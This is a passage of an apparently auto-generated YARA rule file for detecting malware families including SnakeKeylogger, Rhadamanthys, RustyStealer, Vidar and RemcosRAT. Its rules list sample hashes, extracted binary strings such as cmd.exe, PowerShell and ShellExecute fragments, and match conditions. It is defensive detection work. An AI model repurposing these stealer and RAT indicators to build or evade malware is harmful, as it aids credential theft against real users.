      $s3 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.stackPoisonCopy" fullword ascii /* score: '20.00'*/
      $s6 = "type:.eq.golang.org/x/sys/windows.DLL" fullword ascii /* score: '20.00'*/
      $s7 = "type:.eq.golang.org/x/sys/windows.DLLError" fullword ascii /* score: '19.00'*/
      $s8 = "go:itab.*golang.org/x/sys/windows.DLLError,error" fullword ascii /* score: '19.00'*/
      $s9 = "runtime.(*rwmutex).init" fullword ascii /* score: '18.00'*/
      $s10 = "golang.org/x/sys/windows.procGetSystemDirectoryW" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s12 = "runtime: bad notifyList size - sync=accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-" ascii /* score: '18.00'*/
      $s13 = "dressmspan.sweep: bad span stateinvalid profile bucket typeruntime: corrupted polldescruntime: netpollinit failedruntime: asyncP" ascii /* score: '18.00'*/
      $s14 = "runtime.preventErrorDialogs" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.metricReader.compute" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4ed89812_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_18 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4ed89812.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ad70d6c6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4ed89812437a80fce23d4c00bafc70da61f00f23f8c0132863385686c2e8a06d"
      hash2 = "ad70d6c6d21f2f81955549cf07ef09b01fb18ef8e888b4c44d6933d0676cfce4"
   strings:
      $s1 = "get_HowManyTable" fullword ascii /* score: '9.00'*/
      $s2 = "M- -!I" fullword ascii /* score: '9.00'*/
      $s3 = "get_receiptWrite" fullword ascii /* score: '9.00'*/
      $s4 = "get_tablesManager" fullword ascii /* score: '9.00'*/
      $s5 = "get_ProductPrice" fullword ascii /* score: '9.00'*/
      $s6 = "get_ReceiptDateTime" fullword ascii /* score: '9.00'*/
      $s7 = "get_ReceiptMoney" fullword ascii /* score: '9.00'*/
      $s8 = "get_ReceiptID" fullword ascii /* score: '9.00'*/
      $s9 = "get_table_Products" fullword ascii /* score: '9.00'*/
      $s10 = "get_gb_Products" fullword ascii /* score: '9.00'*/
      $s11 = "get_ProductBarkod" fullword ascii /* score: '9.00'*/
      $s12 = "GetDbProducts" fullword ascii /* score: '9.00'*/
      $s13 = "get_productManager" fullword ascii /* score: '9.00'*/
      $s14 = "get_dateTime" fullword ascii /* score: '9.00'*/
      $s15 = "get_product" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__19 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash15 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash16 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash17 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash18 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash19 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
      hash20 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s10 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s11 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s13 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.putempty" fullword ascii /* score: '17.00'*/
      $s15 = "runtime.startTemplateThread" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__323400e787f54999075321a066873519_imphash__Vidar_signature__2ac8b73847300d510d18583a55f34e2f_imphash_20 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_323400e787f54999075321a066873519(imphash).exe, Vidar(signature)_2ac8b73847300d510d18583a55f34e2f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67d842cdd24d2ee0da69fdab43b3ab111f671b770d140e844f33eef71e0283c7"
      hash2 = "b769d0b69427a2c604456819e7e3afe53c65f5ae0df4d45d3ab5dcfdeddeb2ad"
   strings:
      $s1 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s2 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s3 = "error in %s %s%s%s: %s" fullword ascii /* score: '16.50'*/
      $s4 = "SqlExec" fullword ascii /* score: '16.00'*/
      $s5 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii /* score: '15.00'*/
      $s6 = "MUTEX_W32" fullword ascii /* score: '15.00'*/
      $s7 = "USE TEMP B-TREE FOR %s(DISTINCT)" fullword ascii /* score: '14.00'*/
      $s8 = "USE TEMP B-TREE FOR %s(ORDER BY)" fullword ascii /* score: '14.00'*/
      $s9 = "target object/alias may not appear in FROM clause: %s" fullword ascii /* score: '14.00'*/
      $s10 = "Failed to read ptrmap key=%u" fullword ascii /* score: '13.00'*/
      $s11 = "REINDEXEDESCAPEACHECKEYBEFOREIGNOREGEXPLAINSTEADDATABASELECTABLEFTHENDEFERRABLELSEXCLUDELETEMPORARYISNULLSAVEPOINTERSECTIESNOTNU" ascii /* score: '12.50'*/
      $s12 = "UPDATE %Q.sqlite_master SET type='%s', name=%Q, tbl_name=%Q, rootpage=#%d, sql=%Q WHERE rowid=#%d" fullword ascii /* score: '12.50'*/
      $s13 = "error in %s %s after %s: %s" fullword ascii /* score: '12.50'*/
      $s14 = "SQL logic error" fullword ascii /* score: '12.00'*/
      $s15 = "max rootpage (%u) disagrees with header (%u)" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__323400e787f54999075321a066873519_imphash__RustyStealer_signature__5a6918475315610cd8a16ebae564d23d__21 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_323400e787f54999075321a066873519(imphash).exe, RustyStealer(signature)_5a6918475315610cd8a16ebae564d23d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67d842cdd24d2ee0da69fdab43b3ab111f671b770d140e844f33eef71e0283c7"
      hash2 = "2063c4a79c44b398869e1296447f5e687d428113f62f1f22665d8bb5d9c9dda6"
   strings:
      $s1 = "StreamRef::drop; mutex poisoned" fullword ascii /* score: '27.00'*/
      $s2 = "Switching ProtocolsProcessingOKCreatedNon Authoritative InformationNo ContentReset ContentPartial ContentMulti-StatusAlready Rep" ascii /* score: '25.00'*/
      $s3 = "attempted to use a condition variable with more than one mutex" fullword ascii /* score: '24.00'*/
      $s4 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '23.00'*/
      $s5 = "assertion failed: head.len() + tail.len() <= 8" fullword ascii /* score: '19.00'*/
      $s6 = "ServerExtensionClientHelloPayload" fullword ascii /* score: '18.00'*/
      $s7 = "too_many_resetsassertion failed: self.max_stream_id >= last_processed_id" fullword ascii /* score: '18.00'*/
      $s8 = "a spawned task panicked and the runtime is configured to shut down on unhandled panic" fullword ascii /* score: '18.00'*/
      $s9 = "alid HTTP header parsedinvalid content-length parsedunexpected transfer-encoding parsedmessage head is too largeinvalid HTTP sta" ascii /* score: '17.00'*/
      $s10 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s11 = "inactive streamunexpected frame typepayload too bigrejectedrelease capacity too bigstream ID overflowedmalformed headersrequest " ascii /* score: '17.00'*/
      $s12 = "504948474645444342414039383736" wide /* score: '17.00'*/ /* hex encoded string 'PIHGFEDCBA@9876' */
      $s13 = "(SSL.com Root Certification Authority RSA0" fullword ascii /* score: '16.00'*/
      $s14 = "mpletedreceived unexpected message from connectionoperation was canceledchannel closederror trying to connecterror reading a bod" ascii /* score: '16.00'*/
      $s15 = "+SSL.com EV Root Certification Authority ECC0" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a4_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c_22 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash2 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
   strings:
      $s1 = ",System.ObjectModel.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '28.00'*/
      $s2 = "FSystem.Threading.Tasks.Parallel.dll" fullword ascii /* score: '26.00'*/
      $s3 = "GetNextSpan4ReadFirstTokenMultiSegment4SkipWhiteSpaceMultiSegment0ConsumeValueMultiSegment4ConsumeLiteralMultiSegment0CheckLiter" ascii /* score: '22.00'*/
      $s4 = "DSystem.Text.RegularExpressions.dll>System.Threading.Tasks.Parallel" fullword ascii /* score: '22.00'*/
      $s5 = "`System.Collections.IDictionaryEnumerator.get_Key8System.IComparable.CompareTo@" fullword ascii /* score: '22.00'*/
      $s6 = "<EnsureContingentPropertiesInitialized>g__InitializeContingentProperties|81_0XSystem.Threading.IThreadPoolWorkItem.Execute6Inlin" ascii /* score: '22.00'*/
      $s7 = "<EnsureContingentPropertiesInitialized>g__InitializeContingentProperties|81_0XSystem.Threading.IThreadPoolWorkItem.Execute6Inlin" ascii /* score: '22.00'*/
      $s8 = "\"System.Memory.dll$System.ObjectModel" fullword ascii /* score: '19.00'*/
      $s9 = "InsertionSort`System.Collections.IEqualityComparer.GetHashCodeVSystem.Collections.IEqualityComparer.Equals@" fullword ascii /* score: '18.00'*/
      $s10 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance8InitializeClosedInstanceSlowFInitializeClosedInstanceToInterf" ascii /* score: '18.00'*/
      $s11 = "ProcessComment FetchStreamStart" fullword ascii /* score: '18.00'*/
      $s12 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance8InitializeClosedInstanceSlowFInitializeClosedInstanceToInterf" ascii /* score: '18.00'*/
      $s13 = "&CompareValueToValue.<ExecuteCallback>b__9_0@" fullword ascii /* score: '17.00'*/
      $s14 = "kenOrRollbackMultiSegment8ConsumeNextTokenMultiSegmentfConsumeNextTokenFromLastNonCommentTokenMultiSegment6SkipAllCommentsMultiS" ascii /* score: '17.00'*/
      $s15 = "XGetInvalidOperationException_ReadInvalidUTF8" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and pe.imphash() == "636312a5ec1f8b9f790598a6e097c5a4" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__91d07a5e22681e70764519ae943a5883_imphash__RemcosRAT_signature__91d07a5e22681e70764519ae943a5883_imphas_23 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe, RemcosRAT(signature)_91d07a5e22681e70764519ae943a5883(imphash)_1233b7db.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_48ab1f1d.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_6e038a0d.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_88a44698.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_cbded03b.exe, SnakeKeylogger(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_d32c93f3.exe, SnakeKeylogger(signature)_91d07a5e22681e70764519ae943a5883(imphash).exe, SnakeKeylogger(signature)_91d07a5e22681e70764519ae943a5883(imphash)_24314882.exe, SnakeKeylogger(signature)_91d07a5e22681e70764519ae943a5883(imphash)_d03c9135.exe, StormKitty(signature)_6c9794990dcbb89d798ebf671bb8138f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3f5748e7efd5d8d4a483bbfa3cc86a92f2bc6fab7f06b984ddf7d87ce33f4dd"
      hash2 = "1233b7db91898df600fcdc3f572efe9a0852361891ca2cc04a45cf1aab585f41"
      hash3 = "3458469a031246c469a99a7b9ce953a2bf1ab46f3a18b25c8b8d454d13c789eb"
      hash4 = "48ab1f1df7bd293ffc6f49b75a3563aff00dc86990510c1e29563309f2350b44"
      hash5 = "6e038a0d0e3367c4a0bb4bcdb9c6cc9cbf280f97a23033bb68e49fbe86fcc048"
      hash6 = "88a446983108870556c6a2d6ca548d89462e5c63ed42edc017dd5f3e23c3ef61"
      hash7 = "cbded03b82e0ab53202c6d42d37f7f35228410e75770e370b74215372c8355cf"
      hash8 = "d32c93f3b042abc7ba1e686a2a40264718bd0d7ecd990433e2429b0558bc48c6"
      hash9 = "5851f2775a8121c1f942ee8bd8994a43efa931500b96aa37dc1a045812b9c155"
      hash10 = "24314882d285c55d46ee5387af3fdc1fc780c26f262416235c1fe148f2a01c5c"
      hash11 = "d03c9135f1f77622a7db40ad660b3ea55b2bf5008c97ce3b8908564c50ff6a34"
      hash12 = "dd3054a21628f4820afd1532e1e8064f78373ff873af2259d220a60518f640e1"
   strings:
      $s1 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s3 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s4 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s5 = "SCRIPTNAME" fullword wide /* base64 encoded string */ /* score: '22.50'*/
      $s6 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s9 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s10 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s11 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSLIST" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imphash__SnakeKeylogger_signature__d9d3dc366861974d56e9cfc24758d03_24 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash2 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
   strings:
      $x1 = "BSystem.Net.NetworkInformation.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '34.00'*/
      $x2 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&DllImportSearchPath" fullword ascii /* score: '32.00'*/
      $s3 = "NSystem.ComponentModel.TypeConverter.dll:System.Collections.Concurrent" fullword ascii /* score: '25.00'*/
      $s4 = "System.Linq.dll:System.Net.NetworkInformation" fullword ascii /* score: '22.00'*/
      $s5 = "MimeKit.dll$System.ObjectModel" fullword ascii /* score: '22.00'*/
      $s6 = "ExecutionDomain.ReflectionCoreExecution" fullword ascii /* score: '19.00'*/
      $s7 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance@" fullword ascii /* score: '18.00'*/
      $s8 = "<Execute>b__7_0@" fullword ascii /* score: '18.00'*/
      $s9 = "The output buffer is not large enough to contain the decoded input" fullword wide /* score: '18.00'*/
      $s10 = "ContentEncoding.HeaderListChangedAction" fullword ascii /* score: '17.00'*/
      $s11 = "Processg" fullword ascii /* score: '17.00'*/
      $s12 = ",TryGetEncodedWordToken" fullword ascii /* score: '17.00'*/
      $s13 = ".ReceivedTokenSkipDomain0ReceivedTokenSkipAddress4ReceivedTokenSkipMessageId(EncodeReceivedHeaderBEncodeAuthenticationResultsHea" ascii /* score: '16.00'*/
      $s14 = "TElement$IPGlobalProperties0SystemIPGlobalPropertiesDExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s15 = "The output buffer is not large enough to contain the encoded input" fullword wide /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 13000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__57f5111e_RemcosRAT_signature__dfd63ceb_25 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_57f5111e.vbs, RemcosRAT(signature)_dfd63ceb.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "57f5111ee52bcd3bcfb0233efdd8303e0c716efaf028520d3a62b8f832099d09"
      hash2 = "dfd63ceb1b32ed35185764222f6c7173ba9d071d170ba77acc80952ca1d14ce5"
   strings:
      $s1 = "Interconnectionshjlpe = Command " fullword ascii /* score: '17.00'*/
      $s2 = "Uopdagetbinderiesv = Uopdagetbinderiesv * (1+1)" fullword ascii /* score: '16.00'*/
      $s3 = "Rem Trackpot? tempelhal. squamosoradiate: oprundnes" fullword ascii /* score: '14.00'*/
      $s4 = "Wscript.Sleep 100" fullword ascii /* score: '13.00'*/
      $s5 = "Rem Staldfidusers medisterplse" fullword ascii /* score: '12.00'*/
      $s6 = "Rem Beteem: breviloquence langfingrenes superport udbenede" fullword ascii /* score: '12.00'*/
      $s7 = "Curculionidaejockeyern = MidB(\"Afvigende\", 15, 228)" fullword ascii /* score: '12.00'*/
      $s8 = "Rem Postganges128! gaincome ansttelsesperioders13 interspersions tait?" fullword ascii /* score: '12.00'*/
      $s9 = "Rem laudanidine antetemple; bigotteriets" fullword ascii /* score: '11.00'*/
      $s10 = "Rem Sesambollens, templize reconquest131, menziesia16" fullword ascii /* score: '11.00'*/
      $s11 = "Rem Embeggar potchermen; tempesting161?" fullword ascii /* score: '11.00'*/
      $s12 = "Rem scriptoria vesicularity ministerprsidenten:" fullword ascii /* score: '10.00'*/
      $s13 = "Const Forfladigende = \"bistandsorganisation. perisomatic:\"" fullword ascii /* score: '10.00'*/
      $s14 = "Const Indifferente = \"Loggia? palatable143\"" fullword ascii /* score: '9.00'*/
      $s15 = "Rem Pavonazzetto. fodballen: fgtemaskes; operationsstuers" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x7546 and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__26 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exeCertEnumCertificatesInStoreEaster Island Standard TimeG waiting list is corruptedaddress not a sta" ascii /* score: '46.00'*/
      $x2 = "GetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWResumeThreadRevertToSelfSetEndOf" ascii /* score: '44.00'*/
      $x3 = "C:\\Windows\\System32\\cmd.exeCertEnumCertificatesInStoreEaster Island Standard TimeG waiting list is corruptedaddress not a sta" ascii /* score: '35.00'*/
      $x4 = "bad flushGen bad map statedalTLDpSugct?exchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $s5 = "CreateDirectoryWDnsNameCompare_WDuplicateTokenExFlushFileBuffersGC scavenge waitGC worker (idle)GODEBUG: value \"GetComputerName" ascii /* score: '30.00'*/
      $s6 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '28.00'*/
      $s7 = "mstartbad sequence numberbad value for fielddevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile alr" ascii /* score: '27.00'*/
      $s8 = ",M3.2.0,M11.1.0CreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushViewOfFileGetAdaptersInfoGetComma" ascii /* score: '24.00'*/
      $s9 = "cialnetapi32.dllnot pollableraceFiniLockreleasep: m=runtime: gp=runtime: sp=self-preemptshort bufferspanSetSpinesweepWaiterstrac" ascii /* score: '24.00'*/
      $s10 = "4 failedchan receivedumping heapend tracegc" fullword ascii /* score: '24.00'*/
      $s11 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '24.00'*/
      $s12 = "RemoveDirectoryWSetFilePointerExSetThreadContextTerminateProcess\" /t REG_SZ /d \"" fullword ascii /* score: '23.00'*/
      $s13 = "GOMAXPROCSGetIfEntryGetVersionLockFileExWSACleanupWSASocketWWSAStartupatomicand8complex128debug calldnsapi.dllexitThreadfloat32n" ascii /* score: '23.00'*/
      $s14 = "OpenThreadTokenProcess32FirstWRegCreateKeyExWRegDeleteValueWUnmapViewOfFile]" fullword ascii /* score: '23.00'*/
      $s15 = "GOMAXPROCSGetIfEntryGetVersionLockFileExWSACleanupWSASocketWWSAStartupatomicand8complex128debug calldnsapi.dllexitThreadfloat32n" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _To_see_signature__1e0d39391eece9a53254f9143387743a_imphash__To_see_signature__8054ed4a00e159280213636aa14f505f_imphash__27 {
   meta:
      description = "_subset_batch - from files To-see(signature)_1e0d39391eece9a53254f9143387743a(imphash).dll, To-see(signature)_8054ed4a00e159280213636aa14f505f(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "44b6e17af2daabec4c36e6f0233452513e7916d6d7a7991b31e5c4122b7a5735"
      hash2 = "4428e25d655739ede32e83a5722469517f4e7c6bbda62b74cd5373c91e027a6c"
   strings:
      $x1 = "                 `DW_CHILDREN_{yes,no}`The specified length is impossibleFound an unknown `DW_FORM_*` typeExpected a zero, found" ascii /* score: '41.00'*/
      $x2 = "DW_AT_nullDW_AT_siblingDW_AT_locationDW_AT_nameDW_AT_orderingDW_AT_byte_sizeDW_AT_bit_offsetDW_AT_bit_sizeDW_AT_stmt_listDW_AT_l" ascii /* score: '39.00'*/
      $s3 = "PATHPowerShell.exe" fullword ascii /* score: '27.00'*/
      $s4 = "PermissionsNotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnecte" ascii /* score: '27.00'*/
      $s5 = "out of range integral type conversion attemptedcannot parse integer from empty stringinvalid digit found in stringnumber too lar" ascii /* score: '25.00'*/
      $s6 = "getrandom: this target is not supportederrno: did not return a positive valueunexpected situationSecRandomCopyBytes: iOS Securit" ascii /* score: '24.00'*/
      $s7 = "DW_TAG_nullDW_TAG_array_typeDW_TAG_class_typeDW_TAG_entry_pointDW_TAG_enumeration_typeDW_TAG_formal_parameterDW_TAG_imported_dec" ascii /* score: '24.00'*/
      $s8 = "ge to fit in target typenumber too small to fit in target typenumber would be zero for non-zero typeargument of integer logarith" ascii /* score: '19.00'*/
